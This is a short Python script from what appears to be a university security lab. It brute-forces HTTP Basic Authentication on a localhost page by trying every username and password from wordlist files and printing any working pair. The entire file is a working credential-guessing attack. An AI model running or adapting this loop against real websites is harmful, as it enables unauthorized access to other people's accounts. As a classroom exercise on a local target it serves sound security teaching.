#!/usr/bin/python3

# SAT 3310 - Lab 7
# Created by Athena Lieu (xlieu@mtu.edu)
# Date: June 3rd, 2026
# Comments: This script performs a brute-force attack on a protected website using HTTP Basic Authentication.
# It reads common usernames and passwords from files and attempts to access the website with each combination until it finds valid credentials or exhausts all possibilities.
# The script also includes debug statements to provide feedback on the process.

# Modules
import requests
from requests.auth import HTTPBasicAuth

# Variables
websiteurl = "http://127.0.0.1/protected"
localfilepath = "/home/sat3310/Documents/labs/SAT-3310---Lab-7/data/"

usernamefile = "usernames.txt"
passwordfile = "passwords.txt"

found = False
mydebug = True

# Main

# Read usernames and passwords from files and strip newlines
usernames = open(localfilepath + usernamefile).read().splitlines()
passwords = open(localfilepath + passwordfile).read().splitlines()

# Try opening the website without credentials
try:
    response = requests.get(websiteurl)
    if mydebug:
        if response.status_code == 200:
            print("Website not protected!")
            print("The site response is:\n", response.text)
        elif response.status_code == 401:
            print("Website is protected!")
        else:
            print(f"Unexpected status code: {response.status_code}")
except requests.exceptions.RequestException as e:
    print(f"Error connecting to the website: {e}")
    exit(1)

# Outer loop (usernames)
for username in usernames:

    # Inner loop (passwords)
    for password in passwords:

        print("Trying Username:", username,
              "Password:", password)

        response = requests.get(
            websiteurl,
            auth=HTTPBasicAuth(username, password)
        )

        if response.status_code == 401:

            found = False

            if mydebug:
                print("Unauthorized for Username:",
                      username,
                      "Password:",
                      password)

        else:

            found = True

            if mydebug:
                print("Username and password found!")
                print("Username:", username)
                print("Password:", password)
                print(response.headers)
                print(response.text)

            break

    if found:
        break

# Print results
if found:
    print("\nUsername and password found!")
    print("Username:", username)
    print("Password:", password)
else:
    print("\nNo valid username/password combination found.")